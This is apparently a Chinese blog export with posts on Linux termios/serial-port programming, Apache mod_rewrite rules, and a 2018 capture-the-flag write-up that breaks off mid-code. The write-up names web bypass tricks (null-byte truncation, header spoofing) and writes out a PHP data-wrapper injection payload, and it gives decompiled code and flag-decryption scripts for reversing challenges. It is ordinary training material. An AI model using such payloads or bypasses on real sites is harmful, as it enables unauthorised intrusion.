POSIX.1)如若设置，则按规范方式工作。这使下列字符起作用：EOF、EOL、EOL2、ERASE、KILL、REPRINT、STATUS和WERASE。输入字符被装配成行。如果不以规范方式工作，则读请求直接从输入队列取字符。在至少接到MIN个字节或已超过TIME值之前，read将不返回。 ICRNL (c_iflag, POSIX.1)如若设置并且IGNCR未设置，即将接收到的CR字符转换成一个NL字符。 IEXTEN (c_lflag, POSIX.1)如若设置，则识别并处理扩充的、实现定义的特殊字符。 IGNBRK (c_iflag, POSIX.1)在设置时，忽略输入中的BREAK条件。关于BREAK条件是产生信号还是被读作为数据，请见BRKINT。 IGNCR (c_iflag, POSIX.1)如若设置，忽略接收到的CR字符。若此标志未设置，而设置了ICRNL标志则将接收到的CR字符转换成一个NL字符。 IGNPAR (c_iflag, POSIX.1)在设置时，忽略带有结构错误(非BREAK)或奇偶错的输入字节。 IMAXBEL (c_iflag, SVR4和4.3+BSD)当输入队列满时响铃。 INLCR (c_iflag, POSIX.1)如若设置，则接收到的NL字符转换成CR字符。 INPCK (c_iflag, POSIX.1)当设置时，使输入奇偶校验起作用。如若未设置INPCK，则使输入奇偶校验不起作用。奇偶“产生和检测”和“输入奇偶性检验”是不同的两件事。奇偶位的产生和检测是由PARENB标志控制的。设置该标志后使串行界面的设备驱动程序对输出字符产生奇偶位，对输入字符则验证其奇偶性。标志PARODD决定该奇偶性应当是奇还是偶。如果一个其奇偶性为错的字符已经来到，则检查INPCK标志的状态。若此标志已设置，则检查IGNPAR标志(以决定是否应忽略带奇偶错的输入字节)，若不应忽略此输入字节，则检查PARMRK标志以决定向读进程应传送那种字符。 ISIG (c_lflag, POSIX.1)如若设置，则判别输入字符是否是要产生终端信号的特殊字符(INTR，QUIT，SUSP和DSUSP)，若是，则产生相应信号。 ISTRIP (c_iflag, POSIX.1)当设置时，有效输入字节被剥离为7位。当此标志未设置时，则保留全部8位。 IUCLC (c_iflag, SVR4)将输入的大写字符映射为小写字符。 IXANY (c_iflag, SVR4和4.3+BSD)使任一字符都能重新起动输出。 IXOFF (c_iflag, POSIX.1)如若设置，则使起动-停止输入控制起作用。当终端驱动程序发现输入队列将要填满时，输出一个STOP字符。此字符应当由发送数据的设备识别，并使该设备暂停。此后，当已对输入队列中的字符进行了处理后，该终端驱动程序将输出一个START字符，使该设备恢复发送数据。 IXON (c_iflag, POSIX.1)如若设置，则使起动-停止输出控制起作用。当终端驱动程序接收到一个STOP字符时，输出暂停。在输出暂停时，下一个START字符恢复输出。如若未设置此标志，则START和STOP字符由进程读作为一般字符。 MDMBUF (c_cflag, 4.3+BSD)按照调制解调器的载波标志进行输出流控制。 NLDLY (c_oflag, SVR4)新行延迟屏蔽。此屏蔽的值是NL0和NL1。 NOFLSH (c_lflag, POSIX.1)按系统默认，当终端驱动程序产生SIGINT和SIGQUIT信号时，输入、出队列都被刷新。另外，当它产生SIGSUSP信号时，输入队列被刷新。如若设置了NOFLSH标志，则在这些信号产生时，不对输入、出队列进行刷新。 NOKERNINFO (c_lflag, 4.3+BSD)当设置时，此标志阻止STATUS字符使前台进程组的状态信息显示在终端上。但是不论本标志是否设置，STATUS字符使SIGINFO信号送至前台进程组中的所有进程。 OCRNL (c_oflag, SVR4)如若设置，将输出的CR字符映照为NL。 OFDEL (c_oflag, SVR4)如若设置，则输出填充字符是ASCII DEL，否则它是ASCII NUL，见OFILL标志。 OFILL (c_oflag, SVR4)如若设置，则为实现延迟，发送填充字符(ASCII DEL或ASCII NUL，见OFDEL标志)，而不使用时间延迟。见6个延迟屏蔽：BSDLY，CRDLY，FFDLY，NLDLY，TABDLY以及VTDLY。 OLCUC (c_oflag, SVR4)如若设置，将小写字符映射为大写。 ONLCR (c_oflag, SVR4和4.3+BSD)如若设置，将输出的NL字符映照为CR-NL。 ONLRET (c_oflag, SVR4)如若设置，则输出的NL字符将执行回车功能。 ONOCR (c_oflag, SVR4)如若设置，则在0列不输出CR。 ONOEOT (c_oflag, 4.3+BSD)如若设置，则在输出中删除EOT字符(^D)。在将Ctrl-D解释为挂断的终端上这可能是需要的。 OPOST (c_oflag, POSIX.1)如若设置，则进行实现定义的输出处理。 OXTABS (c_oflag, 4.3+BSD)如若设置，制表符在输出中被扩展为空格。这与将水平制表延迟(TABDLY)设置为XTABS或TAB3产生同样效果。 PARENB (c_cflag, POSIX.1)如若设置，则对输出字符产生奇偶位，对输入字符则执行奇偶性检验。若PARODD已设置，则奇偶校验是奇校验，否则是偶校验。也见INPCK、IGNPAR和PARMRK标志部分。 PARMRK (c_iflag, POSIX.1)，当设置时，并且IGNPAR未设置，则结构性错(非BREAK)和奇偶错的字节由进程读作为三个字符序列/377, /0和X，其中X是接收到的具有错误的字节。如若ISTRIP未设置，则一个有效的/377被传送给进程时为/377，/377。如若IGNPAR和PARMRK都未设置，则结构性错和奇偶错的字节都被读作为一个字符/0。 PARODD (c_cflag, POSIX.1)如若设置，则输出和输入字符的奇偶性都是奇，否则为偶。注意，PARENB标志控制奇偶性的产生和检测。 PENDIN (c_lflag, SVR4和4.3+BSD)如若设置，则在下一个字符输入时，尚未读的任何输入都由系统重新打印。这一动作与键入REPRINT字符时的作用相类似。 TABDLY (c_oflag, SVR4)水平制表延迟屏蔽。此屏蔽的值是TAB0、TAB1、TAB2或TAB3。XTABS的值等于TAB3。此值使系统将制表符扩展成空格。系统假定制表符所扩展的空格数到屏幕上最近一个8的倍数处为止。不能更改此假定。 TOSTOP (c_lflag, POSIX.1)如若设置，并且该实现支持作业控制，则将信号SIGTTOU送到试图与控制终端的一个后台进程的进程组。按默认，此信号暂停该进程组中所有进程。如果写控制终端的进程忽略或阻塞此信号，则终端驱动程序不产生此信号。 VTDLY (c_oflag, SVR4)垂直制表延迟屏蔽。此屏蔽的值是VT0或VT1。 XCASE (c_lflag, SVR4)如若设置，并且ICANON也设置，则认为终端是大写终端，所以输入都变换为小写。为了输入一个大写字符，在其前加一个/。与之类似，输出一个大写字符也在其前加一个/(这一标志已经过时，现在几乎所有终端都支持大、小写字符)。 cfmakeraw()cfmakeraw sets the terminal attributes as follows:12345termios_p-&gt;c_iflag &amp;= ~(IGNBRK|BRKINT|PARMRK|ISTRIP|INLCR|IGNCR|ICRNL|IXON);termios_p-&gt;c_oflag &amp;= ~OPOST;termios_p-&gt;c_lflag &amp;= ~(ECHO|ECHONL|ICANON|ISIG|IEXTEN);termios_p-&gt;c_cflag &amp;= ~(CSIZE|PARENB);termios_p-&gt;c_cflag |= CS8; 就是将终端设置为原始模式，该模式下所有的输入数据以字节为单位被处理。在原始模式下，终端是不可回显的，而且所有特定的终端输入/输出模式不可用。 POSIX终端接口很多系统都支持POSIX终端（串口）接口。程序可以利用这个接口来改变终端的参数，比如，波特率，字符大小等等。要使用这个端口的话，你必须将头文件包含到你的程序中。这个头文件中定义了终端控制结构体和POSIX控制函数。 与串口操作相关的最重要的两个POSIX函数可能就是tcgetattr()和tcsetattr()。顾名思义，这两个函数分别用来取得设设置终端的属性。 1、linux中的串口设备文件存放于/dev目录下，其中 串口一，串口二对应设备名依次为 “/dev/ttyS0”、“/dev/ttyS1”。在linux下操作串口与操作文件相同。 2、在使用串口之前必须设置相关配置，包括：波特率、 数据位、校验位、停止位等。串口设置由termios结构体实现。 常用的串口控制函数： 123456Tcgetattr 取属性(termios 结构)Tcsetattr 设置属性(termios 结构)cfgetispeed 得到输入速度Cfgetospeed 得到输出速度Cfsetispeed 设置输入速度Cfsetospeed 设置输出速度 3、串口的配置 (1)保存原先串口配置使用tcgetattr(fd,&amp; oldtio)函数： 12struct termiosnewtio,oldtio;tcgetattr(fd,&amp; oldtio); (2)激活选项有CLOCAL和CREAD,用于本地连接和接收使能。 1newtio.c_cflag|=CLOCAL|CREAD; (3)设置波特率，使用函数cfsetispeed、cfsetospeed 12cfsetispeed(&amp;newtio,B115200);cfsetospeed(&amp;newtio,B115200); (4)设置数据位，需使用掩码设置。 12newtio.c_cflag&amp;=~CSIZE;newtio.c_cflag|=CS8; (5)设置奇偶校验位，使用c_cflag和c_iflag。 设置奇校验： 123newtio.c_cflag|=PARENB; newtio.c_cflag|=PARODD;newtio.c_iflag|=(INPCK|ISTRIP); 设置偶校验： 123newtio.c_iflag|=(INPCK|ISIRIP);newtio.c_cflag|=PARENB;newtio.c_cflag&amp;=~PARODD; (6)设置停止位，通过激活c_cflag中的CSTOPB实现。若停止位为1，则清除CSTOPB，若停止位为 2，则激活CSTOPB。 1newtio.c_cflag&amp;=~CSTOPB; (7)设置最少字符和等待时间，对于接收字符和等待时间没有特别要求时，可设为0。 12newtio.c_cc[VTIME]=0;newtio.c_cc[VMIN]=0; (8)处理要写入的引用对象tcflush函数刷清（抛弃）输入缓存（终端驱动程序已接收到，但用户程序尚未读）或输出缓存（用户程序已经写，但尚未发送）。 1int tcflush(int filedes,int queue) queue数应当是下列三个常数之一： 123TCIFLUSH 刷清输入队列。TCOFLUSH刷清输出队列。TCIOFLUSH刷清输入、输出队列。 如：tcflush(fd,TCIFLUSH); (9)激活配置。在完成配置后，需激活配置使其生效。使用tsettattr()函数。原型： 12int tcgetattr(int filedes,struct termios *termptr);int tcsetattr(int filedes,int opt,const struct termios* termptr); tcsetattr的参数opt使我们可以指定在什么时候新的终端属性才起作用。opt可以指定为下列常数中的一个： TCSANOW更改立即发生。 TCSADRAIN发送了所有输出后更改才发生。若更改输出参数则应使用此选择项。 4 、在配置完串口的相关属性后，就可对串口进行打开,读写操作了。其使用方式与文件操作一样，区别在于串口是一个终端设备. (1)打开串口 1234fd=open(&quot;/dev/ttyS0&quot;,O_RDWR|O_NOCTTY |O_NDELAY);Open函数中除普通参数外,另有两个参数O_NOCTTY和O_NDELAY.O_NOCTTY:通知linux系统,这个程序不会成为这个端口的控制终端。O_NDELAY:通知linux系统不关心DCD信号线所处的状态(端口的另一端是否激活或者停止）。 (2)恢复串口的状态为阻塞状态,用于等待串口数据的读入。用fcntl函数: 1fcntl(fd,F_SETFL,0）; (3)接着,测试打开的文件描述府是否引用一个终端设备,以进一步确认串口是否正确打开. 1isatty(STDIN_FILENO); (4)串口的读写与普通文件一样,使用read,write函数. 12read(fd,buf,8);write(fd,buf,8); kbhit()1234567891011121314151617181920212223int kbhit() //检测键盘是否有输入&#123; struct termios oldt, newt; //控制终端状态的数据结构 int ch; int oldf; tcgetattr(STDIN_FILENO, &amp;oldt); //得到当前终端的状态 newt = oldt; //设置新的终端属性：ICANON和ECHO取反，表示关闭输入行编辑模式，即能够直接读入字符 newt.c_lflag &amp;= ~(ICANON | ECHO); //ICANON：如果在输入中看到&apos;\\n&apos;或者&apos;EOF&apos;，会返回缓冲区内容 //ECHO：控制回显 tcsetattr(STDIN_FILENO, TCSANOW, &amp;newt); //TSCSANOW：告诉函数立即改变终端的STDIN_FILENO的属性值 oldf = fcntl(STDIN_FILENO, F_GETFL, 0); //获取flags，即open函数的第二个参数 //fcntl()的返回值与命令有关。如果出错，所有命令都返回－1，如果成功则返回某个其他值 fcntl(STDIN_FILENO, F_SETFL, oldf | O_NONBLOCK); //增加一个flags，把文件设置成非阻塞 //F_SETFL设置文件状态标记 ch = getchar(); tcsetattr(STDIN_FILENO, TCSANOW, &amp;oldt); //恢复终端设置 fcntl(STDIN_FILENO, F_SETFL, oldf); if(ch != EOF) &#123; ungetc(ch, stdin); //把字符退回到输入流 return 1; &#125; return 0;&#125; fcntl()1、获取文件的flags，即open函数的第二个参数: 1flags = fcntl(fd,F_GETFL,0); 2、设置文件的flags: 1fcntl(fd,F_SETFL,flags); 3、增加文件的某个flags，比如文件是阻塞的，想设置成非阻塞: 12345flags = fcntl(fd,F_GETFL,0);flags |= O_NONBLOCK;fcntl(fd,F_SETFL,flags); 4、取消文件的某个flags，比如文件是非阻塞的，想设置成为阻塞: 12345flags = fcntl(fd,F_GETFL,0);flags &amp;= ~O_NONBLOCK;fcntl(fd,F_SETFL,flags); 参考网站：https://blog.csdn.net/g1036583997/article/details/41277949https://www.cnblogs.com/dartagnan/archive/2013/04/25/3042417.htmlhttps://blog.csdn.net/DiegoTJ/article/details/5454917https://gezhenzhen.wikispaces.com/Linux%E4%B8%B2%E5%8F%A3%E9%80%9A%E4%BF%A1%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86http://www.codexiu.cn/linux/blog/21923/https://blog.csdn.net/liangxiaozhang/article/details/8202965","categories":[],"tags":[{"name":"c","slug":"c","permalink":"blog.b3ale.cn/tags/c/"},{"name":"linux","slug":"linux","permalink":"blog.b3ale.cn/tags/linux/"}]},{"title":"Apache Rewrite（路由重写）","slug":"Apache-Rewrite（路由重写）","date":"2018-05-16T05:36:06.000Z","updated":"2019-08-26T05:54:53.145Z","comments":true,"path":"2018/05/16/Apache-Rewrite（路由重写）/","link":"","permalink":"blog.b3ale.cn/2018/05/16/Apache-Rewrite（路由重写）/","excerpt":"Apache Rewrite 能够实现 URL 的跳转和隐藏真实地址。它基于 Perl 语言的正则表达式规范。平时帮助我们实现拟静态，拟目录，域名跳转，防止盗链等。","text":"Apache Rewrite 能够实现 URL 的跳转和隐藏真实地址。它基于 Perl 语言的正则表达式规范。平时帮助我们实现拟静态，拟目录，域名跳转，防止盗链等。 理解 Apache Rewrite 的三个核心RewriteEngine这个是 rewrite 功能的总开关，用来开启是否启动 url rewrite。 1RewriteEngine on RewriteCondRewriteCond 就是一个过滤条件，简单来说，当 URL 满足 RewriteCond 配置的条件的情况，就会执行 RewriteCond 下面紧邻的 RewriteRule 语句。 RewriteCond 和 RewriteRule 是上下对应的关系。可以有 1 个或者好几个 RewriteCond 来匹配一个 RewriteRule。 RewriteCond %{待测试项目} 正则表达式条件。 123RewriteEngine onRewriteCond %&#123;HTTP_USER_AGENT&#125; ^Mozilla//5/.0.*RewriteRule index.php index.m.php 如果设置上面的匹配规则，到来的 http 请求中的HTTP_USER_AGENT匹配^Mozilla//5/.0.*正则表达式的话，则执行下面的 RewriteRule，也就是说访问路径会跳转到index.m.php这个文件。 RewriteRule1RewriteRule Pattern Substitution [flags] Pattern 是一个正则匹配。Substitution 是匹配的替换 [flags]是一些参数限制。 1RewriteRule ^room/video/(\\d+)\\.html web/index\\.php?c=room&amp;a=video&amp;r=$1 [QSA,NC,L] 意思是 以 room 开头的room/video/123.html这样子，变成web/index.php?c=room&amp;a=video&amp;r=123。 1RewriteRule \\.(jpg|gif) http://image.baidu.com/ [R,NC,L] 意思是以为是访问.jpg 或者 gif 的文件，都会调整到http://image.baidu.com。 重写规则的作用范围 可以使用在 Apache 主配置文件 httpd.conf 中。 可以使用在 httpd.conf 里定义的虚拟主机配置中。 可以使用在基本目录的跨越配置文件.htaccess 中。 这三种方式，都需要在写规则前，用“RewriteEngine on”指令来打开 rewrite 功能。 Apache Rewrite 规则修正符 R=code 强制外部重定向 强制在替代字符串加上http://thishost[:thisport]/前缀重定向到外部的 URL。如果 code 不指定，将用缺省的 302 HTTP 状态码。 F(force URL to be forbidden)禁用 URL,返回 403HTTP 状态码。 G(force URL to be gone) 强制 URL 为 GONE，返回 410HTTP 状态码。 P(force proxy) 强制使用代理转发。 L(last rule) 表明当前规则是最后一条规则，停止分析以后规则的重写。 N(next round) 重新从第一条规则开始运行重写过程。 C(chained with next rule) 与下一条规则关联 如果规则匹配则正常处理，该标志无效，如果不匹配，那么下面所有关联的规则都跳过。 T=MIME-type(force MIME type) 强制 MIME 类型。 NS (used only if no internal sub-request) 只用于不是内部子请求。 NC(no case) 不区分大小写。 QSA(query string append) 追加请求字符串。 NE(no URI escaping of output) 不在输出转义特殊字符。 例如： 1RewriteRule /foo/(.*) /bar?arg=P1%3d$1 [R,NE] #将能正确的将/foo/zoo转换成/bar?arg=P1=zoo PT(pass through to next handler) 传递给下一个处理。 例如： 12RewriteRule ^/abc(.*) /def$1 [PT] # 将会交给/def规则处理Alias /def /ghi S=num(skip next rule(s)) 跳过 num 条规则。 E=VAR:VAL(set environment variable) 设置环境变量。 注：P 是代理模式转发，必须用 url 全称，并且要保证 modProxy 打开，也就是下面 httpd.conf 中的如下两个指令： 12LoadModule proxy_module modules/mod_proxy.soLoadModule proxy_http_module modules/mod_proxy_http.so 如果对应 proxy 模块没加载，则会出现 403 禁止页面。 特殊字符的含义*代表前面 0 或更多个字符。 +代表前面 1 或更多个字符。 ？代表前面 0 或 1 个字符。 ^代表字符串的开始位置。 \\$代表字符串结束的位置。 。为通配符，代表任何字符。 \\将跟在其后的字符还原为字符本身，例如“+”代表的就是“+”，而非其它意思。 ^在方括号里表示非的意思。例如［^.］代表非通配符。 htaccess.htaccess 文件(或者”分布式配置文件”）,全称是 Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过 Apache 的 AllowOverride 指令来设置。概述来说，htaccess 文件是 Apache 服务器中的一个配置文件，它负责相关目录下的网页配置。通过 htaccess 文件，可以帮我们实现：网页 301 重定向、自定义 404 错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。 Apache Rewrite 的方式将 apache 的配置文件 httpd.conf 中 1#LoadModule rewrite_module modules/mod_rewrite.so 前的’#’去掉。找到 ‘AllowOverride None’ 改成 ‘AllowOverride All’。 注：’AllowOverride’的参数设置为’ALL’，表示整台服务器上都支持 URL 规则重写。 对于不同的网址，需要在 APACHE 中增加如下内容： 123456&lt;Directory “E:/Apache Group/Apache2/htdocs/leapsoul”&gt;/*引号里代表你的web存放目录*//*如果是Linux，只要你定位到你网站目录即可*/Options FollowSymLinksAllowOverride None&lt;/Directory&gt; Apache 服务器要读每个网站下目录下的.htaccess文件。如果没有这个文件，或者这个文档没有定义任何关于 URL 重写的规则就不会有任何效果。 只要启用 mod_rewrite，然后简单的通过一个.htaccess文件再加上一些简单的规则就可以移除 URL 中的 index.php 了。 针对整个 apache 服务器的配置在网站配置下加入 123RewriteEngine onRewriteRule index.html index.phpRewriteRule (d+).html$ info.php?id=$1 即通过 index.html 访问就是 index.php；通过 1.html 访问就是 info.php?id=1。 针对 apache 服务器下的某一目录的配置在.htaccess 文件中加入 123RewriteEngine onRewriteCond %&#123;REQUEST_FILENAME&#125; !-f#这里将除了实际文件以为的所有其他请求都指向下行代码给出的脚本，这里是index.phpRewriteRule .* index.php 在 Windows 资源管理器里面不允许你建立.htaccess这样只有扩展名的文件。所以你必须先将文件保存为其他名字，例如app.htaccess。然后进入 cmd，输入ren a.htaccess .htaccess命令来对文件改名。或者新建一个记事本，另存为.htaccess即可。 例子如果文件不存在重定向到 404 页面123RewriteCond %&#123;REQUEST_FILENAME&#125; !-fRewriteCond %&#123;REQUEST_FILENAME&#125; !-dRewriteRule .? /404.php [L] 这里-f 匹配的是存在的文件名，-d 匹配的存在的路径名。这段代码在进行 404 重定向之前，会判断你的文件名以及路径名是否存在【请注意这里】。你还可以在 404 页面上加一个?url=\\$1 参数： 1RewriteRule ^/?(.*)$ /404.php?url=$1 [L] 域名跳转123RewriteEngine onRewriteCond %&#123;HTTP_HOST&#125; ^en.smilejay.com [NC]RewriteRule ^(.*) http://www.smilejay.com/ [L] 配置多用户虚拟服务器12345678910111213ServerAdmin webmaster@kiya.usDocumentRoot /home/www/www.kiya.usServerName dns.kiya.usServerAlias dns.kiya.us kiya.us *.kiya.usCustomLog /var/log/httpd/osa/access_log.log” commonErrorLog /var/log/httpd/osa/error_log.log”AllowOverride NoneOrder deny,allowRewriteEngine onRewriteCond %&#123;HTTP_HOST&#125; ^[^.]+.kiya.(cn|us)$RewriteRule ^(.+) %&#123;HTTP_HOST&#125;$1 [C]RewriteRule ^([^.]+).kiya.(cn|us)(.*)$ /home/www/www.kiya.us/sylvan$3?un=$1&amp;%&#123;QUERY_STRING&#125; [L] 通过 Rewrite 防止盗链1234RewriteEngine OnRewriteCond %&#123;HTTP_REFERER&#125; chinaz.com [NC]RewriteCond %&#123;HTTP_REFERER&#125; im286.com [NC]RewriteRule .*\\.(jpg|jpeg|gif|png|rar|zip|txt|ace|torrent|gz|swf)$ http://www.xxx.com/fuck.png [R,NC,L] 屏蔽 IE 和 Opera 浏览器1234RewriteEngine onRewriteCond %&#123;HTTP_USER_AGENT&#125; ^MSIE [NC,OR]RewriteCond %&#123;HTTP_USER_AGENT&#125; ^Opera [NC]RewriteRule ^.* – [F,L] #这里&quot;-&quot;表示没有替换，浏览器为IE和Opera的访客将被禁止访问。 自动添加.php 扩展名及自动换.html 到.php 扩展名1234567RewriteEngine OnRewriteBase /testRewriteCond %&#123;REQUEST_FILENAME&#125;.php -fRewriteRule ([^/]+)$ /test/$1.php#for example: /test/admin =&gt; /test/admin.phpRewriteRule ([^/]+)\\.html$ /test/$1.php [L]#for example: /test/admin.html =&gt; /test/admin.php 限制仅显示图片123456#限制目录只能显示图片&lt; IfModule mod_rewrite.c&gt;RewriteEngine onRewriteCond %&#123;REQUEST_FILENAME&#125; !^.*\\.(gif|jpg|jpeg|png|swf)$RewriteRule .*$ – [F,L]&lt; /IfModule&gt; 隐藏 index.php12345678910Options +FollowSymLinksIndexIgnore */*RewriteEngine on# if a directory or a file exists, use it directlyRewriteCond %&#123;REQUEST_FILENAME&#125; !-fRewriteCond %&#123;REQUEST_FILENAME&#125; !-d# otherwise forward it to index.phpRewriteRule . index.php 1234RewriteEngine OnRewriteCond %&#123;REQUEST_FILENAME&#125; !-fRewriteCond %&#123;REQUEST_FILENAME&#125; !-dRewriteRule ^(.*)$ index.php/$1 [L] 参考网站：http://www.111cn.net/phper/apache/45642.htmhttp://smilejay.com/2012/10/apache-rewrite/https://www.cnblogs.com/zhenghongxin/p/6798310.htmlhttps://phperzh.com/articles/2922https://zybuluo.com/phper/note/73726","categories":[],"tags":[{"name":"note","slug":"note","permalink":"blog.b3ale.cn/tags/note/"},{"name":"web","slug":"web","permalink":"blog.b3ale.cn/tags/web/"}]},{"title":"2018-ZJGSUCTF","slug":"2018-ZJGSUCTF","date":"2018-05-07T04:06:41.000Z","updated":"2019-08-26T01:15:30.357Z","comments":true,"path":"2018/05/07/2018-ZJGSUCTF/","link":"","permalink":"blog.b3ale.cn/2018/05/07/2018-ZJGSUCTF/","excerpt":"第一次连续肝了两天的比赛，真正感受到了比赛的氛围，还有被大佬带飞的感觉，记录一下简单的几道题。","text":"第一次连续肝了两天的比赛，真正感受到了比赛的氛围，还有被大佬带飞的感觉，记录一下简单的几道题。 WEB奇淫技巧第一关，md5 碰撞。 第二关，数组绕过。 第三关，%00 截断。 第四关，PHP 伪协议data:text/plain,&lt;?php phpinfo()?&gt;。（附上大佬博客） 送分的点击flag in here后，跳转到另一个网站，提示为非法源无法访问。 想到X-Forwarded-For和Referer，经过尝试得到 flag。 给你的小世界打开网站先欣赏一遍精彩的小故事，然后查看源码，得到提示。 第一段字母显然是 base64，然后根据解码后得到的提示分别 base32、base16 解密得到 flag。 RERE 这块主要是复现。 签到题发现题目打不开，原来是文本文件，有一段 C 代码和汇编组成。 可以判断下面的汇编代码就是函数ck1()的汇编形式。具体操作也很容易看出： 12345678910111213.text:0040104A loc_40104A: ; CODE XREF: ck1+1F↑j.text:0040104A mov ecx, [ebp+var_4].text:0040104D cmp ecx, [ebp+arg_4].text:00401050 jge short loc_40106B.text:00401052 mov edx, [ebp+arg_0].text:00401055 add edx, [ebp+var_4].text:00401058 movsx eax, byte ptr [edx].text:0040105B xor eax, 30h.text:0040105E add eax, 1.text:00401061 mov ecx, [ebp+arg_0].text:00401064 add ecx, [ebp+var_4].text:00401067 mov [ecx], al.text:00401069 jmp short loc_401041 可以看到就是把enc字符串中的每个字符分别和0x30异或后再加一。 加密脚本（实际上就是填充函数ck1()的内容）如下： 1234567891011#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() &#123; char enc[37]=\"\\x55\\x5b\\x50\\x56\\x4a\\x66\\x54\\x5b\\x52\\x5e\\x5c\\x54\\x6e\\x43\\x1f\\x6e\\x41\\x54\\x6e\\x43\\x57\\x58\\x42\\x6e\\x58\\x42\\x6e\\x5e\\x5d\\x5b\\x48\\x6e\\x50\\x42\\x5c\\x4c\"; for(int i = 0; i &lt; strlen(enc); i++) &#123; enc[i] ^= 0x30; enc[i] += 1; &#125; printf(\"%s\\n\",enc); return 0;&#125; babyre这题涉及到 ida 的一个小技巧 patch，通过看雪上的一篇文章了解了一下。f5 发现不行，显示栈不平衡，需要 patch。 先根据提示找到出错的位置。在 option 中勾选显示栈指针。然后再找到距离ret最近的call，然后修改栈指针的值。 成功 f5 后审计代码： 1234567891011121314151617181920212223242526272829303132333435int __cdecl main(int argc, const char **argv, const char **envp)&#123; const char *enc1; // esi signed int v4; // eax int v5; // esi char sbox; // [esp+Ch] [ebp-238h] char Dst; // [esp+Dh] [ebp-237h] char key; // [esp+10Ch] [ebp-138h] char v10; // [esp+12Eh] [ebp-116h] char input[52]; // [esp+20Ch] [ebp-38h] sbox = 0; memset(&amp;Dst, 0, 0xFFu); strcpy(&amp;key, \"flag&#123;this_is_not_the_flag_hahaha&#125;\"); memset(&amp;v10, 0, 0xDEu); printf(\"input flag:\\n\"); scanf(\"%50s\", input); if ( strlen(input) == 33 ) &#123; enc1 = base64encypt(input); rc4_init(&amp;sbox, (int)&amp;key, strlen(&amp;key)); rc4_crypto((int)&amp;sbox, (int)enc1, strlen(enc1)); v4 = 0; v5 = enc1 - flag; do &#123; if ( flag[v5 + v4] != flag[v4] ) exit(0); ++v4; &#125; while ( v4 &lt; 44 ); printf(\"Congratulation!!!!!!\\n\"); &#125; return 0;&#125; 经过对代码的审计，判断出先对输入字符串进行了 base64 加密，然后再通过 rc4 加密。在内存中分别找到 base64 的表以及被加密的 flag。 用 python2 中的pycrypto（使用方法：from Crypto.Cipher）进行 rc4 的加解密；用base64库进行 base64 加解密。脚本如下： 123456789101112131415161718from Crypto.Cipher import ARC4import base64import stringprint '-----------------ARC4-----------------'key = 'flag&#123;this_is_not_the_flag_hahaha&#125;'flag = '\\x20\\xC3\\x1A\\xAE\\x97\\x3C\\x7A\\x41\\xDE\\xF6\\x78\\x15\\xCB\\x4B\\x4C\\xDC\\x26\\x55\\x8B\\x55\\xE5\\xE9\\x55\\x75\\x40\\x3D\\x82\\x13\\xA5\\x60\\x13\\x3B\\xF5\\xD8\\x19\\x0E\\x47\\xCF\\x5F\\x5E\\xDE\\x9D\\x14\\xBD'enc1 = ARC4.new(key).decrypt(flag)print enc1print '----------------base64----------------'replaced = ''Base64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'table = 'ABCDEFGHIJSTUVWKLMNOPQRXYZabcdqrstuvwxefghijklmnopyz0123456789+/'for ch in enc1: if ch in Base64: replaced += Base64[string.find(table, str(ch))] elif ch == '=': replaced += '='print base64.b64decode(replaced) New driver拖进 OD 一运行就退出了。拖进 ida 发现有 tls 反调试： 用 PEview 查看 exe 中相关 PE 结构，然后在 010editor 中将对应部分的 value 清零： 除去 tls 后查壳发现有 upx。脱去后放进 ida： 123456789101112131415161718int main_0()&#123; HANDLE thread_2; // [esp+D0h] [ebp-14h] HANDLE thread_1; // [esp+DCh] [ebp-8h] j_read_input(); hObject = CreateMutexW(0, 0, 0); j_strcpy(Dest, Source); thread_1 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)one, 0, 0, 0); thread_2 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)two, 0, 0, 0); CloseHandle(thread_1); CloseHandle(thread_2); while ( dword_418008 != -1 ) ; j_print_dest(); CloseHandle(hObject); return 0;&#125; 一开始读取输入字符串，中间创建了两个线程，然后最后与被加密的 flag 进行比较以及输出 flag。回去看两个线程发现第二个线程没干什么事，主要是第一个线程进行了加密。其中加密函数的 sp 指针不平衡，需要修改指针值。修改后，进入函数： 1234567891011121314151617181920char **__cdecl encrypt(char *input, int index)&#123; char **result; // eax char v3; // [esp+D3h] [ebp-5h] v3 = input[index]; if ( (v3 &lt; 'a' || v3 &gt; 'z') &amp;&amp; (v3 &lt; 'A' || v3 &gt; 'Z') ) exit(0); if ( v3 &lt; 'a' || v3 &gt; 'z' ) // lower case &#123; result = (char **)table; input[index] = table[input[index] - 38]; &#125; else // upper case &#123; result = (char **)table; input[index] = table[input[index] - 96]; &#125; return result;&#125; 对每个字符大小写进行了判断，然后减法操作。还有一点是两个线程每次循环分别都 sleep 了 100s，那么依次循环就会造成奇偶依次加密。solve 脚本： 12345678910111213table = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm'enc = [0x54, 0x4F, 0x69, 0x5A, 0x69, 0x5A, 0x74, 0x4F, 0x72, 0x59, 0x61, 0x54, 0x6F, 0x55, 0x77, 0x50, 0x6E, 0x54, 0x6F, 0x42, 0x73, 0x4F, 0x61, 0x4F, 0x61, 0x70, 0x73, 0x79, 0x53, 0x79]flag = ''for i in range(len(enc)): if i % 2 == 0: flag += chr(enc[i]) else: idx = table.index(chr(enc[i])) if idx &gt; 26: # lower case flag += chr(idx + 38) else: # upper case flag += chr(idx + 96)print 'flag:', flag Old driver32 位 exe 文件，拖进 ida 后，除了判断了字串长度为 40 和前后缀的 check，还发现函数被加密了： 12345678910111213141516171819202122232425262728293031323334353637int __cdecl main(int argc, const char **argv, const char **envp)&#123; int i; // ecx signed int j; // eax char input[39]; // [esp+0h] [ebp-40h] char v7; // [esp+27h] [ebp-19h] int v8; // [esp+34h] [ebp-Ch] __int16 v9; // [esp+38h] [ebp-8h] char v10; // [esp+3Ah] [ebp-6h] input[0] = 0; memset(&amp;input[1], 0, 0x31u); printf(\"input flag:\\n\"); scanf(\"%50s\", input); if ( strlen(input) == 40 ) &#123; for ( i = 0; i &lt; (char *)nullsub_1 - (char *)dword_401000; ++i 